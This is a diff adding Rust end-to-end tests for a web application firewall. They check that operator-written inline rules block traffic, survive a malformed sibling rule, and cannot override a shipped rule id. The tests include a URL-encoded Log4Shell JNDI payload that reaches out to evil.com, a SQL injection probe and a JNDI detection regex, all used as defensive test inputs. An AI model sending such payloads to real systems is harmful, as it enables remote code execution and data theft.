@@ -579,3 +579,214 @@ async fn e2e_ml_allows_clean_request_with_no_rules() {
     );
     assert!(body.starts_with(b"upstream-ok:"));
 }
+
+// ---------------------------------------------------------------------------
+// Operator-authored (inline) rules from the control plane.
+//
+// Until 2026-07-28 these were stored in Postgres and never delivered, so a rule
+// written in the UI showed as "enabled" and did nothing. These tests exercise the
+// delivered path end-to-end through a real proxy, and pin the two failure
+// behaviours that decide whether the feature is safe to expose to a customer.
+// ---------------------------------------------------------------------------
+
+use sentinel_core::config::InlineRule;
+
+// Real SRL. NOTE: the rule's name IS its numeric id, and the operator form is
+// `rx /pattern/` — not the `rule foo { id: N; op: rx("...") }` shape that the
+// seeded sample rules use, which does not parse at all.
+const LOG4SHELL_SRL: &str = r#"
+rule 9999900 {
+    phase    : request_body
+    targets  : ARGS
+    operator : rx /\$\{jndi:/
+    action   : block
+    severity : critical
+    message  : "Log4Shell JNDI lookup"
+}
+"#;
+
+const MARKER_SRL: &str = r#"
+rule 9999901 {
+    phase    : request_body
+    targets  : ARGS
+    operator : rx /EVILMARKER/
+    action   : block
+    severity : critical
+    message  : "test marker"
+}
+"#;
+
+const SHADOW_SRL: &str = r#"
+rule 942100 {
+    phase    : request_body
+    targets  : ARGS
+    operator : rx /NEVERMATCHES/
+    action   : log
+    severity : info
+    message  : "attempted shadow of a shipped rule id"
+}
+"#;
+
+/// A site carrying ONLY inline rules — no rule files at all — so any block is
+/// necessarily produced by the inline path and nothing else.
+fn inline_only_config(
+    listen_port: u16,
+    upstream_port: u16,
+    inline: Vec<InlineRule>,
+) -> SentinelConfig {
+    SentinelConfig {
+        listeners: vec![ListenerConfig {
+            name: "test".into(),
+            bind: format!("127.0.0.1:{listen_port}"),
+            protocol: ProtocolSpec::Single(Protocol::Http1),
+            tls: None,
+            default_site: Some("test-site".into()),
+            role: Default::default(),
+        }],
+        sites: vec![SiteConfig {
+            id: "test-site".into(),
+            tenant_id: String::new(),
+            domains: vec!["test-site.local".into(), "localhost".into()],
+            upstream: UpstreamConfig {
+                load_balancer: sentinel_core::config::LoadBalancerStrategy::RoundRobin,
+                servers: vec![UpstreamServer {
+                    host: "127.0.0.1".into(),
+                    port: upstream_port,
+                    weight: 1,
+                    tls: false,
+                }],
+                health_check: None,
+            },
+            waf: WafConfig {
+                mode: WafMode::Blocking,
+                rules: vec![],
+                inline_rules: inline,
+                anomaly_threshold: 5,
+                paranoia_level: 2,
+                ..Default::default()
+            },
+            plugins: vec![],
+            tls: Default::default(),
+        }],
+        ..Default::default()
+    }
+}
+
+/// The headline case: a virtual patch written by an operator actually blocks.
+/// Modelled on the Log4Shell shape, which is why the feature exists — a CVE lands
+/// and waiting for a data-plane image rebuild is not an option.
+#[tokio::test]
+async fn inline_rule_from_control_plane_is_enforced() {
+    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
+    let listen_port = next_port();
+    let cfg = inline_only_config(
+        listen_port,
+        upstream_addr.port(),
+        vec![InlineRule {
+            name: "VP-CVE-2021-44228".into(),
+            dsl: LOG4SHELL_SRL.into(),
+        }],
+    );
+    let (shutdown_tx, jh) = start_proxy(cfg).await;
+
+    let (blocked, _) = send_request(
+        listen_port,
+        "test-site.local",
+        "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D",
+        Method::GET,
+        "",
+    )
+    .await;
+    let (allowed, _) =
+        send_request(listen_port, "test-site.local", "/?x=ok", Method::GET, "").await;
+
+    shutdown_proxy(shutdown_tx, jh).await;
+    assert_eq!(
+        blocked,
+        StatusCode::FORBIDDEN,
+        "an operator-authored rule must actually block; if this is 200 the rule \
+         reached the data plane but was not enforced"
+    );
+    assert_eq!(
+        allowed,
+        StatusCode::OK,
+        "the inline rule must not block unrelated traffic"
+    );
+}
+
+/// A rule typed into a web form WILL sometimes be malformed. One bad row must not
+/// disarm the rules around it — that would turn an operator typo into an outage,
+/// and it is the difference between this feature being safe to expose or not.
+#[tokio::test]
+async fn one_malformed_inline_rule_does_not_disarm_the_others() {
+    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
+    let listen_port = next_port();
+    let cfg = inline_only_config(
+        listen_port,
+        upstream_addr.port(),
+        vec![
+            InlineRule {
+                name: "broken-rule".into(),
+                dsl: "rule oops { this is not valid SRL at all ((( ".into(),
+            },
+            InlineRule {
+                name: "good-rule".into(),
+                dsl: MARKER_SRL.into(),
+            },
+        ],
+    );
+    let (shutdown_tx, jh) = start_proxy(cfg).await;
+
+    let (status, _) = send_request(
+        listen_port,
+        "test-site.local",
+        "/?q=EVILMARKER",
+        Method::GET,
+        "",
+    )
+    .await;
+
+    shutdown_proxy(shutdown_tx, jh).await;
+    assert_eq!(
+        status,
+        StatusCode::FORBIDDEN,
+        "the valid rule must still be enforced despite a malformed sibling"
+    );
+}
+
+/// An inline rule reusing a shipped rule's id is refused rather than allowed to
+/// shadow it: with two rules answering to one id, an exclusion for that id cannot
+/// say which one it means, and scoring silently doubles.
+#[tokio::test]
+async fn inline_rule_may_not_shadow_a_shipped_rule_id() {
+    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
+    let listen_port = next_port();
+
+    // Load the real CRS SQLi file, then try to redefine 942100 as a no-op that
+    // would allow traffic the genuine rule blocks.
+    let rule_path = crs_rule_dir().join("REQUEST-942-APPLICATION-ATTACK-SQLI.conf");
+    let mut cfg = inline_only_config(listen_port, upstream_addr.port(), vec![]);
+    cfg.sites[0].waf.rules = vec![rule_path.to_string_lossy().to_string()];
+    cfg.sites[0].waf.inline_rules = vec![InlineRule {
+        name: "shadow-942100".into(),
+        dsl: SHADOW_SRL.into(),
+    }];
+    let (shutdown_tx, jh) = start_proxy(cfg).await;
+
+    let (status, _) = send_request(
+        listen_port,
+        "test-site.local",
+        "/search?q=1%27%20OR%201%3D1--",
+        Method::GET,
+        "",
+    )
+    .await;
+
+    shutdown_proxy(shutdown_tx, jh).await;
+    assert_eq!(
+        status,
+        StatusCode::FORBIDDEN,
+        "the shipped 942100 must still block; a colliding inline rule must be \
+         refused, not allowed to override it"
+    );
+}
